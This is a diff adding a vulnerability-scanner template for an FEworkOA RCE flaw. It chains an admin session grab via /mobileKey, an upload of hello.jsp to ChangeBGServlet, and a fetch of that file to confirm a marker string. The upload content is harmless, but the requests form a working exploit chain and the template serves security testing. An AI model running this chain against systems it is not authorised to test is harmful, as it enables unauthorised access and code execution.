@@ -1,0 +1,88 @@
+id: FEworkOA-ChangeBGServlet-RCE
+
+info:
+  name: FEworkOA-ChangeBGServlet-RCE
+  author: iSee857
+  severity: critical
+  description: |
+    FEworkOA-ChangeBGServlet-RCE
+  tags: intrusive
+flow: http(1) && http(2) && http(3)
+
+http:
+  - raw:
+      - |
+        POST /mobileKey HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Content-Type: application/x-www-form-urlencoded
+
+        userName=admin
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "true"
+    extractors:
+      - type: regex
+        name: session
+        group: 1
+        part: header
+        internal: true
+        regex:
+          - "Set-Cookie: SESSION=([a-zA-Z0-9\\-]+);"
+
+  - raw:
+      - |
+        POST /servlet/ChangeBGServlet HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryNxj6ATqxnclLfnCL
+        Accept: */*
+        Cookie: SESSION={{session}}
+        Connection: close
+
+        ------WebKitFormBoundaryNxj6ATqxnclLfnCL
+        Content-Disposition: form-data; name="file"; filename="hello.jsp"
+        Content-Type: text/plain
+
+        123321
+        ------WebKitFormBoundaryNxj6ATqxnclLfnCL--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ".jsp"
+          - "saveName"
+    extractors:
+      - type: regex
+        name: path
+        group: 1
+        part: body
+        internal: true
+        regex:
+          - "\"path\":\"([^\"]+)\""
+
+  - raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+        Cookie: SESSION={{session}}
+        
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "123321"
